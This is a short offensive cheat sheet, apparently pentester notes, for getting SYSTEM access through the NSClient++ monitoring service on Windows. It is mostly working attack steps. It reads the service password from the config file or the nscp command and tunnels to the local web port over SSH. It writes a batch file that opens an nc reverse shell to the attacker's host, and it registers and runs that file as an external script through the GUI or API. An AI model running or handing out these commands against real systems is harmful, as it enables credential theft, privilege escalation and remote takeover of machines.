# NSClient++ Script Execution SYSTEM

NSClient++ monitoring service runs as SYSTEM. If you have creds or can read `nsclient.ini`, add an external script and execute it.

**Get password (from shell as low-priv user):**
```cmd
nscp web -- password --display
# or: type "C:\Program Files\NSClient++\nsclient.ini"
```

**Allowed hosts restriction:** `nsclient.ini` often restricts to `127.0.0.1` — tunnel first:
```bash
ssh <user>@<TARGET> -L 8443:127.0.0.1:8443
```

**Create payload on target:**
```cmd
echo C:\programdata\nc.exe <LHOST> <LPORT> -e cmd > C:\programdata\shell.bat
```

**Via web GUI (https://127.0.0.1:8443):**
1. Settings → External Scripts → Scripts → Add new
2. Command: `C:\programdata\shell.bat`
3. Save changes → Control → Reload
4. Queries → run the script → shell returns as SYSTEM

**Via API:**
```bash
# Get token
curl -sk -u admin:<pass> https://127.0.0.1:8443/api/v1/auth
# Add script + query via REST endpoints
```
